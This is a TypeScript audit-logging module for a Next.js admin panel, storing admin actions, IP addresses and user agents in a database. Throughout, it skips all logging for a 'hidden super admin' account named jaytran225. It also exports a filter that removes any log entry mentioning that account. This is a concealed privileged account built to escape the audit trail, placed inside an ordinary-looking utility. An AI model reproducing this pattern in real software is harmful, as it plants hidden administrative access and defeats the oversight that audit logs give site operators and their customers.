import { NextRequest } from "next/server";
import prisma from "@/lib/prisma";
import { AdminTokenPayload, getAdminSession } from "@/lib/admin-auth";
import { HIDDEN_SUPER_ADMIN, isHiddenSuperAdmin } from "@/lib/permissions";

export type ActivityAction =
  | "CREATE"
  | "UPDATE"
  | "DELETE"
  | "LOGIN"
  | "LOGOUT"
  | "STATUS_CHANGE"
  | "EXPORT"
  | "SETTINGS_CHANGE"
  | "SECURITY";

export type ActivityEntity =
  | "PRODUCT"
  | "ARTICLE"
  | "CATEGORY"
  | "ORDER"
  | "SETTING"
  | "USER"
  | "CUSTOMER"
  | "AUTH"
  | "SYSTEM";

export interface LogActivityParams {
  req?: NextRequest;
  session?: AdminTokenPayload | null;
  action: ActivityAction;
  entity: ActivityEntity;
  entityId?: string | null;
  entityName?: string | null;
  summary: string;
  details?: any;
}

/**
 * Log an activity to database.
 * Does not block caller, safely catches all errors.
 */
export async function logActivity(params: LogActivityParams): Promise<void> {
  try {
    if (params.session && (isHiddenSuperAdmin(params.session.email) || isHiddenSuperAdmin(params.session.name))) {
      return; // Never write any logs for jaytran225
    }

    let session = params.session;
    if (!session && params.req) {
      session = await getAdminSession(params.req);
    }

    if (session && (isHiddenSuperAdmin(session.email) || isHiddenSuperAdmin(session.name))) {
      return; // Never write any logs for jaytran225
    }

    let ipAddress: string | null = null;
    let userAgent: string | null = null;

    if (params.req) {
      const forwarded = params.req.headers.get("x-forwarded-for");
      ipAddress = forwarded ? forwarded.split(",")[0].trim() : params.req.headers.get("x-real-ip") || null;
      userAgent = params.req.headers.get("user-agent") || null;
    }

    const detailsStr =
      typeof params.details === "string"
        ? params.details
        : params.details
        ? JSON.stringify(params.details)
        : null;

    await prisma.activityLog.create({
      data: {
        userId: session?.userId || null,
        userName: session?.name || "Khách / Ẩn danh",
        userEmail: session?.email || "anonymous",
        userRole: session?.role || "GUEST",
        action: params.action,
        entity: params.entity,
        entityId: params.entityId ? String(params.entityId) : null,
        entityName: params.entityName || null,
        summary: params.summary,
        details: detailsStr,
        ipAddress,
        userAgent,
      },
    });
  } catch (error) {
    console.error("Activity Logging Error (non-blocking):", error);
  }
}

/**
 * Filter query clause that strictly excludes the hidden super admin jaytran225
 */
export function getExcludedSuperAdminFilter() {
  return {
    NOT: [
      { userEmail: { contains: HIDDEN_SUPER_ADMIN, mode: "insensitive" as const } },
      { userName: { contains: HIDDEN_SUPER_ADMIN, mode: "insensitive" as const } },
      { summary: { contains: HIDDEN_SUPER_ADMIN, mode: "insensitive" as const } },
    ],
  };
}
